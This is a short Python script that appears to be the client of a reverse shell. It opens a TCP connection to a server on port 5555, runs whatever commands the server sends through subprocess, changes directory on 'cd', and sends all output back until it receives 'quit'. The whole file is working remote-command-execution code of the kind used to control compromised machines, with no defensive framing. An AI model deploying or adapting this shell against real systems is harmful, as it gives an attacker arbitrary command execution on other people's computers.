import time, socket, os, subprocess, sys
from plyer import notification

ip_address = socket.gethostbyname(socket.gethostname())
port = 5555
address = ip_address, port

# Make client socket and connect it to the server.
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(address)

def main():

	# Use to recieve commands send by server and execute them and send the results to the server.
	while True:

		commands = client.recv(2024).decode('utf-8')

		# Stop the connection if server sends 'quit'.
		if(commands == 'quit'):

			break
			sys.exit()

		# Change the directory. 
		if('cd' in commands):

			try:

				os.chdir(commands[3:])

			except (FileNotFoundError, OSError):
				pass

		output = subprocess.getoutput(commands)

		# If output of the command is empty it returns nothing.
		if(output == ''):

			client.send('\t'.encode('utf-8'))

		# Send all data to the server.
		client.send(output.encode('utf-8'))

	client.close()

main()